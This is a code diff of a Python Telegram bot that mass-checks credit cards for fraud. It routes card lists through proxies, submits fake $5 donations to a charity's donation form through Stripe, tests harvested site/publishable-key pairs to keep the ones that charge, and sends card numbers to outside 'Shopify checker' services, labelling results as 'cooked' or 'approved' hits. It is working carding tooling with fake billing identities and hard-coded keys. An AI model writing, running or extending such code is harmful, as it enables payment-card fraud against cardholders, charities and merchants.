-                'give-form-minimum': '5.00',
-                'give-form-maximum': '999999.99',
-                'give-form-hash': ssa,
-                'give-price-id': 'custom',
-                'give-amount': '5.00',
-                'give_tributes_type': 'DrGaM Of',
-                'give_tributes_show_dedication': 'no',
-                'give_tributes_radio_type': 'In Honor Of',
-                'give_tributes_first_name': '',
-                'give_tributes_last_name': '',
-                'give_tributes_would_to': 'send_mail_card',
-                'give-tributes-mail-card-personalized-message': '',
-                'give_tributes_mail_card_notify_first_name': '',
-                'give_tributes_mail_card_notify_last_name': '',
-                'give_tributes_address_country': 'US',
-                'give_tributes_mail_card_address_1': '',
-                'give_tributes_mail_card_address_2': '',
-                'give_tributes_mail_card_city': '',
-                'give_tributes_address_state': 'MI',
-                'give_tributes_mail_card_zipcode': '',
-                'give_stripe_payment_method': '',
-                'payment-mode': 'stripe',
-                'give_first': 'drgam ',
-                'give_last': 'drgam ',
-                'give_email': 'lolipnp@gmail.com',
-                'give_comment': '',
-                'card_name': 'drgam ',
-                'billing_country': 'US',
-                'card_address': 'drgam sj',
-                'card_address_2': '',
-                'card_city': 'tomrr',
-                'card_state': 'NY',
-                'card_zip': '10090',
-                'give_action': 'purchase',
-                'give-gateway': 'stripe',
-                'action': 'give_process_donation',
-                'give_ajax': 'true',
-            }
-            session.post(f"{site_url}/wp-admin/admin-ajax.php", headers=headers_ajax, data=data_init, timeout=20)
-
-            # Create Stripe payment method
-            stripe_headers = {
-                'authority': 'api.stripe.com',
-                'accept': 'application/json',
-                'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
-                'content-type': 'application/x-www-form-urlencoded',
-                'origin': 'https://js.stripe.com',
-                'referer': 'https://js.stripe.com/',
-                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
-                'sec-ch-ua-mobile': '?1',
-                'sec-ch-ua-platform': '"Android"',
-                'user-agent': ua,
-            }
-            stripe_data = f'type=card&billing_details[name]=drgam++drgam+&billing_details[email]=lolipnp%40gmail.com&billing_details[address][line1]=drgam+sj&billing_details[address][line2]=&billing_details[address][city]=tomrr&billing_details[address][state]=NY&billing_details[address][postal_code]=10090&billing_details[address][country]=US&card[number]={c}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=d4c7a0fe-24a0-4c2f-9654-3081cfee930d03370a&muid=3b562720-d431-4fa4-b092-278d4639a6f3fd765e&sid=70a0ddd2-988f-425f-9996-372422a311c454628a&payment_user_agent=stripe.js%2F78c7eece1c%3B+stripe-js-v3%2F78c7eece1c%3B+split-card-element&referrer=https%3A%2F%2Fhigherhopesdetroit.org&time_on_page=85758&client_attribution_metadata[client_session_id]=c0e497a5-78ba-4056-9d5d-0281586d897a&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=split-card-element&client_attribution_metadata[merchant_integration_version]=2017&key={pk}&_stripe_account=acct_1C1iK1I8d9CuLOBr&radar_options'
-            e = session.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data, timeout=20)
-            payment_id = e.json().get('id')
-            if not payment_id:
-                return "Failed to create payment method"
-
-            # Final donation submission
-            headers_final = {
-                'authority': site_url.replace('https://', ''),
-                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-                'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
-                'content-type': 'application/x-www-form-urlencoded',
-                'origin': site_url,
-                'referer': donate_url,
-                'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
-                'sec-ch-ua-mobile': '?1',
-                'sec-ch-ua-platform': '"Android"',
-                'user-agent': ua,
-            }
-            params = {'payment-mode': 'stripe', 'form-id': ss000a00}
-            data_final = {
-                'give-honeypot': '',
-                'give-form-id-prefix': ssa00,
-                'give-form-id': ss000a00,
-                'give-form-title': 'Give a Donation',
-                'give-current-url': donate_url,
-                'give-form-url': donate_url,
-                'give-form-minimum': '5.00',
-                'give-form-maximum': '999999.99',
-                'give-form-hash': ssa,
-                'give-price-id': 'custom',
-                'give-amount': '5.00',
-                'give_tributes_type': 'In Honor Of',
-                'give_tributes_show_dedication': 'no',
-                'give_tributes_radio_type': 'Drgam Of',
-                'give_tributes_first_name': '',
-                'give_tributes_last_name': '',
-                'give_tributes_would_to': 'send_mail_card',
-                'give-tributes-mail-card-personalized-message': '',
-                'give_tributes_mail_card_notify_first_name': '',
-                'give_tributes_mail_card_notify_last_name': '',
-                'give_tributes_address_country': 'US',
-                'give_tributes_mail_card_address_1': '',
-                'give_tributes_mail_card_address_2': '',
-                'give_tributes_mail_card_city': '',
-                'give_tributes_address_state': 'MI',
-                'give_tributes_mail_card_zipcode': '',
-                'give_stripe_payment_method': payment_id,
-                'payment-mode': 'stripe',
-                'give_first': 'drgam ',
-                'give_last': 'drgam ',
-                'give_email': 'lolipnp@gmail.com',
-                'give_comment': '',
-                'card_name': 'drgam ',
-                'billing_country': 'US',
-                'card_address': 'drgam sj',
-                'card_address_2': '',
-                'card_city': 'tomrr',
-                'card_state': 'NY',
-                'card_zip': '10090',
-                'give_action': 'purchase',
-                'give-gateway': 'stripe',
-            }
-            r4 = session.post(donate_url, params=params, headers=headers_final, data=data_final, timeout=20)
-            text = r4.text
-            if 'Your card was declined.' in text:
-                return "card_declined"
-            elif 'Your card has insufficient funds.' in text:
-                return "insufficient_funds"
-            elif 'Thank you' in text or 'Thank you for your donation' in text or 'succeeded' in text or 'true' in text or 'success' in text:
-                return "Charge ✅"
-            elif 'Your card number is incorrect.' in text:
-                return "incorrect_CVV2"
-            else:
-                return "Card_reject"
-        except Exception as e:
-            return f"Error: {str(e)}"
-
     # ==========================================================================
-    # CALLBACK HANDLERS
+    # Filter selection for Shopify
     # ==========================================================================
     @bot.callback_query_handler(func=lambda call: call.data == "run_mass_shopify")
-    def callback_shopify(call):
+    def callback_shopify_filter(call):
         try:
             bot.delete_message(call.message.chat.id, call.message.message_id)
             user_id = call.from_user.id
+            if not user_allowed(user_id):
+                bot.send_message(call.message.chat.id, "🚫 Access Denied.")
+                return
             if user_id not in user_sessions or 'ccs' not in user_sessions[user_id]:
                 bot.send_message(call.message.chat.id, "⚠️ Session expired. Upload file again.")
                 return
 
-            proxies = get_active_proxies(user_id)
-            if not proxies:
-                bot.send_message(
-                    call.message.chat.id,
-                    "🚫 <b>Proxy Required!</b>\n\n"
-                    "You have 0 proxies in your pool.\n"
-                    "<b>To add proxies:</b>\n"
-                    "1. Upload a <code>.txt</code> file\n"
-                    "2. OR use <code>/addpro ip:port:user:pass</code>",
-                    parse_mode='HTML'
-                )
+            # Get and validate proxies
+            proxies = get_active_proxies_for_user(user_id, bot, call.message)
+            if proxies is None:
                 return
 
-        # ✅ Send a status message first (this will be used for live updates)
+            user_sessions[user_id]['temp_proxies'] = proxies
+
+            markup = types.InlineKeyboardMarkup(row_width=2)
+            markup.add(
+                types.InlineKeyboardButton("🔥 Cooked Only", callback_data="shopify_filter_cooked"),
+                types.InlineKeyboardButton("✅ Approved Only", callback_data="shopify_filter_approved"),
+                types.InlineKeyboardButton("Both", callback_data="shopify_filter_both")
+            )
+            bot.send_message(
+                call.message.chat.id,
+                "🔍 <b>Select which hits to display:</b>",
+                reply_markup=markup,
+                parse_mode='HTML'
+            )
+        except Exception as e:
+            bot.send_message(call.message.chat.id, f"❌ Error: {e}")
+
+    @bot.callback_query_handler(func=lambda call: call.data.startswith("shopify_filter_"))
+    def callback_start_shopify_mass(call):
+        try:
+            bot.delete_message(call.message.chat.id, call.message.message_id)
+            filter_choice = call.data.replace("shopify_filter_", "")  # cooked / approved / both
+            user_id = call.from_user.id
+
+            if not user_allowed(user_id):
+                bot.send_message(call.message.chat.id, "🚫 Access Denied.")
+                return
+            if user_id not in user_sessions or 'ccs' not in user_sessions[user_id]:
+                bot.send_message(call.message.chat.id, "⚠️ Session expired. Upload file again.")
+                return
+
+            proxies = user_sessions[user_id].get('temp_proxies')
+            if not proxies:
+                bot.send_message(call.message.chat.id, "🚫 Proxies missing. Please restart.")
+                return
+
+            del user_sessions[user_id]['temp_proxies']
+
             start_msg = bot.send_message(
                 call.message.chat.id,
                 f"🔥 <b>Shopify Mass Check Started...</b>\n"
                 f"💳 Cards: {len(user_sessions[user_id]['ccs'])}\n"
-                f"🔌 Proxies: {len(proxies)}",
+                f"🔌 Proxies: {len(proxies)}\n"
+                f"🎯 Filter: {filter_choice.upper()}",
                 parse_mode='HTML'
             )
 
             process_mass_check_engine(
-                bot, call.message, start_msg,  # <-- pass the message object, not None
+                bot, call.message, start_msg,
                 user_sessions[user_id]['ccs'],
                 get_filtered_sites_func(),
                 proxies,
                 check_site_shopify_direct,
                 process_response_func,
-                update_stats_func
+                update_stats_func,
+                hit_filter=filter_choice
             )
         except Exception as e:
             bot.send_message(call.message.chat.id, f"❌ Error: {e}")
 
-    @bot.callback_query_handler(func=lambda call: call.data == "run_mass_stripe_configdb")
-    def callback_stripe_configdb(call):
-        try:
-            bot.delete_message(call.message.chat.id, call.message.message_id)
-            user_id = call.from_user.id
-            if user_id not in user_sessions or 'ccs' not in user_sessions[user_id]:
-                bot.send_message(call.message.chat.id, "⚠️ Session expired. Upload file again.")
-                return
-
-            proxies = get_active_proxies(user_id)
-            if not proxies:
-                bot.send_message(call.message.chat.id, "🚫 Proxy Required!", parse_mode='HTML')
-                return
-
-            process_mass_gate_check(
-                bot, call.message,
-                user_sessions[user_id]['ccs'],
-                gates.check_stripe_configdb,
-                "Stripe Auth (ConfigDB)",
-                proxies
-            )
-        except Exception as e:
-            bot.send_message(call.message.chat.id, f"❌ Error: {e}")
-
-    @bot.callback_query_handler(func=lambda call: call.data == "run_mass_braintree")
-    def callback_braintree(call):
-        try:
-            bot.delete_message(call.message.chat.id, call.message.message_id)
-            user_id = call.from_user.id
-            if user_id not in user_sessions or 'ccs' not in user_sessions[user_id]:
-                bot.send_message(call.message.chat.id, "⚠️ Session expired. Upload file again.")
-                return
-
-            proxies = get_active_proxies(user_id)
-            if not proxies:
-                bot.send_message(call.message.chat.id, "🚫 Proxy Required!", parse_mode='HTML')
-                return
-
-            process_mass_gate_check(
-                bot, call.message,
-                user_sessions[user_id]['ccs'],
-                gates.check_braintree,
-                "Braintree $50",
-                proxies
-            )
-        except Exception as e:
-            bot.send_message(call.message.chat.id, f"❌ Error: {e}")
-
+    # ==========================================================================
+    # Other mass check callbacks (updated to use improved hit sender)
+    # ==========================================================================
     @bot.callback_query_handler(func=lambda call: call.data == "run_mass_stripe_donation")
     def callback_stripe_donation(call):
         try:
             bot.delete_message(call.message.chat.id, call.message.message_id)
             user_id = call.from_user.id
+            if not user_allowed(user_id):
+                bot.send_message(call.message.chat.id, "🚫 Access Denied.")
+                return
             if user_id not in user_sessions or 'ccs' not in user_sessions[user_id]:
                 bot.send_message(call.message.chat.id, "⚠️ Session expired. Upload file again.")
                 return
 
-            proxies = get_active_proxies(user_id)
-            if not proxies:
-                bot.send_message(call.message.chat.id, "🚫 Proxy Required!", parse_mode='HTML')
+            proxies = get_active_proxies_for_user(user_id, bot, call.message)
+            if proxies is None:
                 return
 
             process_mass_gate_check(
@@ -916,13 +509,15 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
         try:
             bot.delete_message(call.message.chat.id, call.message.message_id)
             user_id = call.from_user.id
+            if not user_allowed(user_id):
+                bot.send_message(call.message.chat.id, "🚫 Access Denied.")
+                return
             if user_id not in user_sessions or 'ccs' not in user_sessions[user_id]:
                 bot.send_message(call.message.chat.id, "⚠️ Session expired. Upload file again.")
                 return
 
-            proxies = get_active_proxies(user_id)
-            if not proxies:
-                bot.send_message(call.message.chat.id, "🚫 Proxy Required!", parse_mode='HTML')
+            proxies = get_active_proxies_for_user(user_id, bot, call.message)
+            if proxies is None:
                 return
 
             process_mass_gate_check(
@@ -940,13 +535,15 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
         try:
             bot.delete_message(call.message.chat.id, call.message.message_id)
             user_id = call.from_user.id
+            if not user_allowed(user_id):
+                bot.send_message(call.message.chat.id, "🚫 Access Denied.")
+                return
             if user_id not in user_sessions or 'ccs' not in user_sessions[user_id]:
                 bot.send_message(call.message.chat.id, "⚠️ Session expired. Upload file again.")
                 return
 
-            proxies = get_active_proxies(user_id)
-            if not proxies:
-                bot.send_message(call.message.chat.id, "🚫 Proxy Required!", parse_mode='HTML')
+            proxies = get_active_proxies_for_user(user_id, bot, call.message)
+            if proxies is None:
                 return
 
             process_mass_gate_check(
@@ -959,17 +556,9 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
         except Exception as e:
             bot.send_message(call.message.chat.id, f"❌ Error: {e}")
 
-    @bot.callback_query_handler(func=lambda call: call.data == "action_cancel")
-    def callback_cancel(call):
-        try:
-            bot.delete_message(call.message.chat.id, call.message.message_id)
-            bot.send_message(call.message.chat.id, "❌ Operation cancelled.")
-        except Exception as e:
-            bot.send_message(call.message.chat.id, f"❌ Error: {e}")
-
-    # ============================================================================
-    # 📥 COMMAND: /stsite - Upload and test Stripe Donation Sites
-    # ============================================================================
+    # ==========================================================================
+    # /stsite command (unchanged)
+    # ==========================================================================
     @bot.message_handler(commands=['stsite'])
     def handle_stsite_command(message):
         if message.from_user.id not in OWNER_ID:
@@ -1001,7 +590,6 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
                 line = line.strip()
                 if not line or line.startswith('#'):
                     continue
-                # Flexible regex: look for a URL and a pk_live string
                 match = re.search(r'(https?://[^\s|]+).*?(pk_live_[a-zA-Z0-9]+)', line, re.IGNORECASE)
                 if match:
                     url = match.group(1).rstrip('/')
@@ -1012,11 +600,9 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
                 bot.reply_to(message, "❌ No valid URL+PK pairs found in the file.")
                 return
 
-            # Store candidates temporarily
-            user_id = message.from_user.id
             if not hasattr(bot, 'pending_stsite'):
                 bot.pending_stsite = {}
-            bot.pending_stsite[user_id] = candidates
+            bot.pending_stsite[message.from_user.id] = candidates
 
             bot.reply_to(
                 message,
@@ -1037,7 +623,6 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
             return
 
         test_cc = message.text.strip()
-        # Basic format check
         if not re.match(r'\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}', test_cc):
             bot.reply_to(message, "❌ Invalid card format. Use `CC|MM|YYYY|CVV`", parse_mode='Markdown')
             return
@@ -1049,14 +634,12 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
 
         status_msg = bot.reply_to(message, f"🔄 Testing {total} sites with your card... This may take a while.", parse_mode='HTML')
 
-        # Use a random proxy if available
         proxy = random.choice(proxies_data['proxies']) if proxies_data['proxies'] else None
 
         for idx, site in enumerate(candidates, 1):
             url = site['url']
             pk = site['pk']
             try:
-                # Update status every 5 sites
                 if idx % 5 == 0 or idx == total:
                     bot.edit_message_text(
                         f"🔄 Testing sites... {idx}/{total}\n"
@@ -1065,7 +648,6 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
                         message.chat.id, status_msg.message_id
                     )
 
-                # Use the helper function defined above
                 result = test_donation_site_like_script(url, pk, test_cc, proxy)
                 if result == "Charge ✅":
                     working.append(site)
@@ -1074,7 +656,6 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
             except Exception as e:
                 failed.append(f"{url} (error: {str(e)[:50]})")
 
-        # Save only working sites
         donation_file = "donation_sites.json"
         if os.path.exists(donation_file):
             with open(donation_file, 'r') as f:
@@ -1082,7 +663,6 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
         else:
             existing = []
 
-        # Add new working sites (avoid duplicates)
         added = 0
         for site in working:
             if not any(s['url'] == site['url'] for s in existing):
@@ -1096,10 +676,8 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
         with open(donation_file, 'w') as f:
             json.dump(existing, f, indent=2)
 
-        # Clean up pending data
         del bot.pending_stsite[user_id]
 
-        # Final report
         report = (
             f"✅ **Testing Complete**\n\n"
             f"📊 Total candidates: {total}\n"
@@ -1114,29 +692,9 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
 
         bot.edit_message_text(report, message.chat.id, status_msg.message_id, parse_mode='Markdown')
 
-    # ============================================================================
-    # 📩 MESSAGING
-    # ============================================================================
-    def send_hit(bot, chat_id, res, title):
-        try:
-            bin_info = get_bin_info(res['cc'])
-            site_name = res['site_url'].replace('https://', '').split('/')[0]
-            msg = f"""
-┏━━━━━━━⍟
-┃ <b>{title} HIT!</b>
-┗━━━━━━━━━━━⊛
-💳 <b>Card:</b> <code>{res['cc']}</code>
-💰 <b>Resp:</b> {res['response']}
-💲 <b>Amt:</b> ${res['price']}
-🌐 <b>Site:</b> {site_name}
-🔌 <b>Gate:</b> {res['gateway']}
-🏳️ <b>Info:</b> {bin_info.get('country_flag','')} {bin_info.get('bank','')}
-━━━━━━━━━━━━━━━━━━━━
-"""
-            bot.send_message(chat_id, msg, parse_mode='HTML')
-        except:
-            pass
-
+    # ==========================================================================
+    # UI update helpers
+    # ==========================================================================
     def update_ui(bot, chat_id, mid, processed, total, results):
         try:
             msg = f"""
@@ -1169,8 +727,152 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
         except:
             bot.send_message(chat_id, msg, parse_mode='HTML')
 
+    # ==========================================================================
+    # Cancel callback
+    # ==========================================================================
+    @bot.callback_query_handler(func=lambda call: call.data == "action_cancel")
+    def callback_cancel(call):
+        try:
+            bot.delete_message(call.message.chat.id, call.message.message_id)
+            bot.send_message(call.message.chat.id, "❌ Operation cancelled.")
+        except Exception as e:
+            bot.send_message(call.message.chat.id, f"❌ Error: {e}")
 
+    # Return the new permission function if needed elsewhere
+    return user_allowed
 
+# ============================================================================
+# Shopify checker with fallback (improved)
+# ============================================================================
+def check_site_shopify_direct(site_url, cc, proxy=None):
+    import urllib.parse
+    import requests
+    import re
 
+    def call_api(api_base):
+        try:
+            clean_site = site_url.rstrip('/')
+            proxy_str = proxy
+            api_proxy = ""
+            if proxy_str:
+                proxy_str = proxy_str.strip()
+                parts = proxy_str.split(':')
+                if len(parts) == 4:
+                    api_proxy = proxy_str
+                elif '@' in proxy_str:
+                    match = re.match(r'(?:http://)?([^:]+):([^@]+)@([^:]+):(\d+)', proxy_str)
+                    if match:
+                        user, password, host, port = match.groups()
+                        api_proxy = f"{host}:{port}:{user}:{password}"
+                elif len(parts) == 2:
+                    api_proxy = proxy_str
 
+            encoded_cc = urllib.parse.quote(cc)
+            encoded_proxy = urllib.parse.quote(api_proxy) if api_proxy else ""
 
+            if api_base == "mentoschk":
+                url = f"http://mentoschk.com/shopify?site={clean_site}&cc={encoded_cc}"
+                if encoded_proxy:
+                    url += f"&proxy={encoded_proxy}"
+            else:  # hqdumps
+                api_key = "techshopify"
+                url = f"https://hqdumps.com/autoshopify/index.php?key={api_key}&url={clean_site}&cc={encoded_cc}"
+                if encoded_proxy:
+                    url += f"&proxy={encoded_proxy}"
+
+            session = requests.Session()
+            session.verify = False
+            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
+            response = session.get(url, headers=headers, timeout=90)
+
+            if response.status_code != 200:
+                print(f"[API] {api_base} returned {response.status_code}")
+                return None
+
+            data = response.json()
+            print(f"[API] {api_base} raw response: {data}")
+
+            if api_base == "mentoschk":
+                return {
+                    'Response': data.get('Response', 'Unknown'),
+                    'Price': str(data.get('Price', '0.00')),
+                    'Gateway': data.get('Gateway', 'Shopify API'),
+                    'Status': data.get('Status', False)
+                }
+            else:
+                resp_text = data.get('Response', 'Unknown')
+                status = False if 'UNABLE' in resp_text.upper() or 'FAILED' in resp_text.upper() else True
+                return {
+                    'Response': resp_text,
+                    'Price': str(data.get('Price', '0.00')),
+                    'Gateway': data.get('Gate', 'Shopify API'),
+                    'Status': status
+                }
+        except Exception as e:
+            print(f"[API] {api_base} exception: {e}")
+            return None
+
+    # Try primary API
+    result = call_api("mentoschk")
+
+    # If primary failed (None) OR returned a non‑successful response, try secondary
+    if result is None:
+        result = call_api("hqdumps")
+    else:
+        # Determine if the response is already a clear success
+        resp_text = result['Response'].upper()
+        approved_keywords = ['THANK YOU', 'ORDER PLACED', 'CONFIRMED', 'SUCCESS', 'INSUFFICIENT FUNDS']
+        approved_otp_keywords = ['3DS', 'ACTION_REQUIRED', 'OTP_REQUIRED', '3D SECURE']
+        if not any(k in resp_text for k in approved_keywords + approved_otp_keywords):
+            # Not a success – try secondary
+            result2 = call_api("hqdumps")
+            if result2 is not None:
+                result = result2
+
+    if result is None:
+        return {
+            'Response': 'Both APIs failed',
+            'status': 'ERROR',
+            'gateway': 'Shopify API',
+            'price': '0.00',
+            'message': 'No response from any API'
+        }
+
+    response_text = result['Response']
+    price = result['Price']
+    gateway = result['Gateway']
+    status_bool = result['Status']
+    response_upper = response_text.upper()
+
+    # --- Enhanced mapping ---
+    approved_keywords = ['THANK YOU', 'ORDER PLACED', 'CONFIRMED', 'SUCCESS', 'INSUFFICIENT FUNDS', 'INSUFFICIENT_FUNDS']
+    approved_otp_keywords = ['3DS', 'ACTION_REQUIRED', 'OTP_REQUIRED', '3D SECURE']
+    declined_keywords = ['CARD DECLINED', 'DECLINED', 'EXPIRED_CARD', 'EXPIRED', 'FRAUD', 'SUSPECTED',
+                         'INCORRECT CVC', 'INCORRECT_CVC', 'INCORRECT ZIP', 'INCORRECT_ZIP',
+                         'INCORRECT NUMBER', 'INCORRECT_NUMBER', 'INVALID NUMBER', 'DO NOT HONOR',
+                         'PICKUP', 'LOST CARD', 'STOLEN CARD', 'AMOUNT TOO SMALL', 'AMOUNT_TOO_SMALL']
+    extra_declined = ['SUBMIT REJECTED', 'PAYMENTS_CREDIT_CARD_NUMBER_INVALID_FORMAT',
+                      'PAYMENTS_CREDIT_CARD_VERIFICATION_VALUE_INVALID_FOR_CARD_TYPE',
+                      'PAYMENTS_CREDIT_CARD_SESSION_ID']
+    error_keywords = ['FAILED TO TOKENIZE CARD', 'SITE DEAD', 'GENERIC_ERROR', 'DEAD/TIMEOUT',
+                      'TIMEOUT', 'PROXY', 'UNABLE TO GET PAYMENT TOKEN', 'CART ADD FAILED',
+                      'SUBMIT FAILED', 'RECHECK']
+
+    if any(k in response_upper for k in approved_keywords):
+        status = 'APPROVED'
+    elif any(k in response_upper for k in approved_otp_keywords):
+        status = 'APPROVED_OTP'
+    elif any(k in response_upper for k in declined_keywords + extra_declined):
+        status = 'DECLINED'
+    elif any(k in response_upper for k in error_keywords):
+        status = 'ERROR'
+    else:
+        status = 'ERROR' if status_bool is False else 'DECLINED'
+
+    return {
+        'Response': response_text,
+        'status': status,
+        'gateway': gateway,
+        'price': price,
+        'message': response_text
+    }
